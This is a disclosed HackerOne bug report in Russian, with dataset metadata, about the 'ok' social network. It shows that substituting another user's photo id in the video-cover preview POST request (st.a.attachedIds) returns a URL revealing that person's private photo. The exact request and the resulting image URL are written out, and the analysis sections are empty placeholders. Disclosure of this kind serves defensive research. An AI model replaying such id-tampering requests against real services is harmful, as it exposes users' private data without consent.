---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '78516'
original_report_id: '78516'
title: Доступ к чужим приватным фотографиям (3) через обложку видео
weakness: Privilege Escalation
team_handle: ok
created_at: '2015-07-25T01:26:07.891Z'
disclosed_at: '2016-04-29T09:58:46.375Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- privilege-escalation
---

# Доступ к чужим приватным фотографиям (3) через обложку видео

## Metadata

- HackerOne Report ID: 78516
- Weakness: Privilege Escalation
- Program: ok
- Disclosed At: 2016-04-29T09:58:46.375Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

При выборе обложки видео происходит запрос:

>POST /dk?cmd=CustomCoverPreview&st.a.hookId=160344447&st.a.objectId=customCover_31471307517

>st.a.attachedIds=%5B%7B%22type%22%3A%22PHOTOODKL%22%2C%22id%22%3A%22803633705029%22%7D%5D&gwt.requested=129bff65

Подменяя id фотографии в параметре st.a.attachedIds в теле ответа получаем урл:
http://pimg.mycdn.me/getImage?disableStub=true&type=VIDEO_S_288&url=http%3A%2F%2Fitd1.mycdn.me%2Fimage%3Ft%3D50%26bid%3D803633705029%26id%3D803633705029%26plc%3DWEB%26tkn%3DijQhFLoZF4a893ZE5lZS0e_E5MM&signatureToken=TNH2WJhWuKD1w_lgzlUBDQ
В котором в слегка обрезанном виде получаем приватную фотографию.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
